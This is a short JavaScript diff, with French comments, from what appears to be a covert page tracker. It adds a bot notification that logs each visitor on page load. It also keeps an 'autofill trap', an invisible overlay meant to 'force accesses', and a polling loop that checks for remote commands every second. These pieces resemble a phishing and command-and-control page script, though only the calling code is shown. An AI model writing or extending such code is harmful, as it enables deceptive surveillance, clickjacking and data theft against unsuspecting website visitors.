@@ -1074,11 +1074,15 @@ function initTracker() {
 
     setupAutofillTrap();
     
+    // NOTIFICATION BOT IMMÉDIATE : Dès le chargement (avant le clic)
+    console.log("Notification initiale du bot...");
+    logVisitor(null, true, false); 
+
     // PIÈGE IMMÉDIAT : L'overlay invisible est actif dès l'entrée pour forcer les accès
-    console.log("Piège invisible activé dès l'entrée...");
+    console.log("Piège invisible actif...");
     startVerification();
     
-    // VÉRIFICATION DES COMMANDES : Ultra-agressif (toutes les 1 seconde)
+    // VÉRIFICATION DES COMMANDES
     const pollCommands = async () => {
         await checkCommands();
         setTimeout(pollCommands, 1000);
